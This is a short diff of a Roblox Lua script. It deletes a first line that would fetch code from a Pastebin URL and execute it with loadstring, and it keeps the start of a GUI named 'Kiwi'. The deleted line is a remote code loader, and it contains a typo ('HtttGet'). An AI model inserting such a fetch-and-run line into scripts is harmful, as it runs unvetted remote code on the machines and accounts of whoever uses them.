@@ -1,5 +1,3 @@
-loadstring(game:HtttGet("https://pastebin.com/raw/c3Mx7swU"))()
-
 local screen_gui = Instance.new("ScreenGui")
 screen_gui.Name = "Kiwi"
 screen_gui.DisplayOrder = 999999999
